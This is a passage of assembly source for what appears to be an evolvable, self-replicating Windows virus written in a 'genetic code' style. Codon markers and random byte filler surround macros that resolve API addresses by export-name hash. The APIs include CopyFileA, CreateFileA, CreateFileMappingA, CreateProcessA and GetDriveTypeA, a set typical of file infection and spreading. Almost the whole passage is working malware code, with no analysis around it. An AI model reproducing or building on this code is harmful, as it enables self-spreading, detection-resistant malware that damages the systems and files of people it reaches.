db 178
db 182
db 223
db 219
db 26
db 40
db 180
db 174
db 39
db 39
db 177
db 49
db 75
db 24
db 71
db 12
db 84
db 118
db 193
db 104
db 115
db 135
db 204
db 101
db 190
db 245
db 156
db 255
db 5
db 185
db 162
db 69
db 158
db 102
db 16
db 56
db 96
db 223
db 83
db 238
db 164
db 51
db 176
db 2
db 224
db 181
db 98
db 138
db 69
db 247
db 172
db 239
db 32
db 97
db 63
db 171
db 111
db 113
db 219
db 191
db 185
db 10
db 223
db 220
db 33
db 22
db 195
db 0
db 128
db 92
db 133
db 93
db 52
db 204
db 186
db 243
db 42
db 99
db 121
db StartCodon
db StopCodon
db 41
db 26
db 43
db 237
db 194
db 203
db 188
db 46
db 126
db 175
db 114
db 111
db 157
db 151
db StartCodon
db StopCodon
db 76
db 140
db 24
db 139
db 182
db 231
db 154
db 236
db 35
db 126
db 4
db 107
db 255
db 255
db 125
db 181
db 28
db 216
db 112
db 88
db 143
db 55
db 30
db 139
db 92
db 102
db 96
db 53
db 108
db 221
db 141
db 67
db 50
db 65
db 170
db 115
db 155
db 117
db 210
db StartCodon
db StopCodon
db 165
db 201
db 231
db 132
db 99
db 205
db 233
db 253
db 171
db 49
db 239
db 91
db 106
db 166
db 17
db 208
db 88
db 230
db 217
db 158
db 14
db 115
db 106
db 147
db 6
db StartCodon
db StopCodon
db 178
db 43
db 17
db StartCodon
db StopCodon
db 93
db 148
db 94
db 111
db 69
db 29
db 248
db 172
db 208
db 192
db 95
db 32
db 208
db 66
db 55
db 202
db 18
db 145
db 244
db 167
db 162
db 169
db StartCodon

; ############################################################################
; ############################################################################
; ############################################################################
; #####
; #####  Here the genom gets the Addresses of the Windows APIs.
; #####  It loads via LoadLibrary the kernel32.dll and advapi32.dll,
; #####  searchs in the Export Table for the adequade API (creating
; #####  an internal 12 bit checksum, and compares it with some hardcoded
; #####  12bit values). This procedere should be evolvable.
; #####
; #####  Optimum would have been to call the Windows APIs by its
; #####  Ordinal Numbers, but they change at every release of Windows.
; #####
; #####  At Linux, evolvable API calls are already presented, as you
; #####  call int 0x80 with a specific number in eax which represents
; #####  the API number.
; #####
; #####
;
; The Hash-Algo is equivalent to:
; ===============================
;
;;FindAPIGiveMeTheHash:
;; In: ebx=pointer to API name
;; Out: eax=Hash   (in ax)
;; changed: eax
;;        mov     ebx, apistr
;
;        push    ebx
;        push    ecx
;        push    edx
;        xor     eax, eax
;        xor     ecx, ecx
;        dec     ebx
;        FindAPIGiveMeTheHashMore:
;                inc     ebx
;                mov     ecx, dword[ebx]
;                xor     eax, ecx
;                mov     edx, ecx        ; ecx=nooo - n ... new byte
;                shr     edx, 8          ; edx=000n ... new byte
;                cmp     dl, 0           ; dl=n
;        jne     FindAPIGiveMeTheHashMore
;
;        and     eax, 0x0FFF
;        pop     edx
;        pop     ecx
;        pop     ebx
;ret



StAminoAcids1:
;        repeat 100
;            _nopREAL
;        end repeat


       db _START
       db _STOP

       db _START

    _getDO
db StopCodon
db StartCodon
    BigNum=mCloseHandle-DataOffset
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
db StopCodon
db 62
db 59
db 18
db 160
db 28
db 30
db 32
db 72
db 76
db 7
db 185
db 19
db 157
db 172
db 209
db 118
db 165
db 98
db 150
db 150
db 16
db 188
db 245
db 243
db 161
db 138
db 108
db 29
db 115
db 162
db 255
db 3
db 92
db 93
db 23
db 15
db 248
db 73
db 93
db 41
db 126
db 112
db 185
db 36
db 69
db 54
db 66
db 60
db 57
db 41
db 253
db 60
db 8
db 108
db 178
db 184
db 253
db 48
db 25
db 44
db 223
db 151
db 205
db 225
db 231
db 128
db 234
db 117
db 240
db 60
db 136
db StartCodon
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
db StopCodon
db 227
db 45
db 238
db 210
db 219
db 102
db 190
db 4
db 11
db 236
db 85
db 108
db 35
db 2
db StartCodon
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
       _saveWrtOff
_save           ; BC2=BC1
db StopCodon
db 81
db 117
db 160
db 75
db 212
db 93
db 246
db 214
db 56
db 121
db 52
db 147
db 153
db 203
db 223
db 173
db 209
db 60
db 2
db 224
db 160
db 91
db 229
db 255
db 189
db 113
db 34
db 68
db 51
db 127
db 255
db 163
db 46
db 246
db 170
db 55
db 22
db 175
db 185
db 205
db 211
db 51
db 166
db 73
db 160
db StartCodon
_xor            ; BC1=BC1 XOR BC2 = 0
    BigNum=0x0342
    AlreadyStarted=0
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
db StopCodon
db 176
db 84
db 91
db 199
db 243
db 25
db 245
db StartCodon
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
       _writeDWord

    _getDO
    BigNum=mCopyFileA-DataOffset
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
db StopCodon
db 207
db 3
db 180
db 19
db 111
db StartCodon
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
db StopCodon
db 46
db 57
db 133
db 243
db 118
db 199
db 30
db 137
db 19
db 17
db 243
db 69
db 131
db 192
db 79
db 83
db 106
db 242
db 75
db 92
db 169
db 89
db 219
db 45
db 240
db 246
db 244
db 201
db 156
db 243
db 49
db 28
db 76
db 190
db 192
db 15
db 72
db 216
db StartCodon
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
db StopCodon
db 237
db 173
db 111
db 62
db 33
db 199
db 145
db 28
db 156
db 20
db 128
db 120
db 83
db 163
db 250
db 173
db 168
db 88
db 210
db 20
db 65
db 18
db 94
db 143
db 230
db 231
db 157
db 121
db 186
db 3
db 91
db 214
db 155
db 42
db 214
db 52
db StartCodon
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
       _saveWrtOff
_save           ; BC2=BC1
_xor            ; BC1=BC1 XOR BC2 = 0
    BigNum=0x0C5C
    AlreadyStarted=0
db StopCodon
db 181
db 216
db 84
db 57
db 176
db 156
db 143
db 194
db 143
db 255
db 244
db 247
db 64
db 203
db 181
db 174
db 253
db 73
db 57
db 23
db 129
db 96
db StartCodon
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
db StopCodon
db 221
db 89
db 203
db 105
db 139
db 67
db 88
db 73
db 54
db 163
db 174
db 241
db 238
db 214
db 215
db 122
db 141
db 135
db 110
db StartCodon
        _saveWrtOff             ; BA1=RegC
db StopCodon
db 242
db 239
db 36
db 145
db 50
db 103
db 5
db 170
db 127
db 123
db 63
db 87
db 172
db 37
db 247
db 85
db 44
db 40
db 91
db 115
db 254
db 195
db 191
db 190
db 76
db 161
db 36
db 11
db 166
db 107
db 51
db 49
db 49
db 60
db 126
db 226
db 117
db 29
db 243
db 193
db 188
db 13
db StartCodon
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
       _writeDWord
db StopCodon
db 165
db 76
db 90
db 170
db 172
db 71
db 33
db 49
db 119
db 40
db 153
db 107
db 64
db 63
db 228
db StartCodon

    _getDO
    BigNum=mCreateFileA-DataOffset
    AlreadyStarted=0
db StopCodon
db 154
db 150
db 211
db 33
db 126
db 11
db 200
db 203
db 145
db 62
db 173
db 161
db 36
db 42
db 195
db StartCodon
    if BigNum<25
db StopCodon
db 240
db 253
db 66
db 128
db 20
db 254
db 19
db 210
db 144
db 213
db 183
db 116
db 97
db 68
db 158
db 201
db 138
db 53
db 87
db 6
db 227
db 6
db 9
db 193
db 100
db 118
db 138
db 13
db 81
db StartCodon
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
db StopCodon
db 217
db 89
db 235
db 11
db 142
db 97
db 126
db 54
db 46
db 50
db 52
db 213
db 59
db 23
db 108
db 227
db 43
db 172
db 183
db 67
db 167
db 170
db 55
db 13
db 95
db 249
db 87
db 38
db 30
db StartCodon
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
       _saveWrtOff
_save           ; BC2=BC1
_xor            ; BC1=BC1 XOR BC2 = 0
    BigNum=0x0615
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
db StopCodon
db StartCodon
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
       _writeDWord
db StopCodon
db 52
db 139
db 30
db 147
db 250
db 185
db StartCodon

    _getDO
    BigNum=mCreateFileMappingA-DataOffset
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
db StopCodon
db StartCodon
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
       _saveWrtOff
db StopCodon
db 240
db 50
db 85
db 163
db 16
db 59
db 75
db 116
db 137
db 245
db 12
db 216
db 236
db 157
db 227
db 200
db 135
db 15
db 147
db StartCodon
_save           ; BC2=BC1
_xor            ; BC1=BC1 XOR BC2 = 0
    BigNum=0x04E1
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
       _writeDWord

    _getDO
    BigNum=mCreateProcessA-DataOffset
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
db StopCodon
db 1
db 101
db 7
db 22
db 82
db 197
db 47
db 86
db 47
db 165
db 198
db 99
db 238
db 179
db 114
db 249
db 144
db 248
db 173
db 86
db 107
db 165
db 72
db 254
db 143
db 233
db 113
db 186
db 131
db 215
db 196
db 97
db 62
db 64
db 238
db 82
db 171
db 104
db 112
db 251
db 5
db 208
db 105
db 90
db 69
db 234
db 177
db 146
db 238
db 52
db 144
db 130
db 148
db 192
db 130
db 124
db 42
db 5
db 122
db 112
db 112
db 80
db 247
db 255
db 220
db 213
db 133
db 166
db 213
db 229
db 16
db 239
db 159
db 239
db 43
db 149
db 55
db 171
db 194
db 205
db 176
db 76
db 235
db 187
db 10
db StartCodon
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
       _saveWrtOff
_save           ; BC2=BC1
_xor            ; BC1=BC1 XOR BC2 = 0
    BigNum=0x0674
    AlreadyStarted=0
    if BigNum<25
db StopCodon
db 159
db 241
db 9
db 237
db 88
db 185
db 154
db 144
db 20
db 204
db 187
db 220
db 149
db 117
db 135
db 32
db 51
db 140
db 208
db 95
db 63
db 29
db 145
db 137
db 127
db 15
db 29
db 141
db 241
db 242
db 242
db 238
db 246
db 215
db 114
db 230
db 87
db 79
db 247
db 219
db 144
db 133
db 226
db 156
db 113
db 169
db 169
db 45
db 30
db 90
db 57
db 88
db 80
db 106
db 49
db 124
db 161
db 203
db StartCodon
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
db StopCodon
db StartCodon
        _pop
db StopCodon
db 239
db 56
db 218
db 61
db 201
db 102
db 44
db 186
db 42
db 197
db 46
db 2
db 43
db 164
db 133
db 43
db 212
db 245
db 119
db 181
db 251
db 97
db 146
db 62
db 159
db 32
db 232
db 20
db 66
db 1
db 203
db 44
db 169
db 1
db 219
db 45
db StartCodon
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
       _writeDWord

    _getDO
    BigNum=mGetDriveTypeA-DataOffset
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
       _saveWrtOff
_save           ; BC2=BC1
_xor            ; BC1=BC1 XOR BC2 = 0
    BigNum=0x0AFD
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
       _writeDWord

    _getDO
    BigNum=mGetCommandLineA-DataOffset
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
       _saveWrtOff
_save           ; BC2=BC1
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
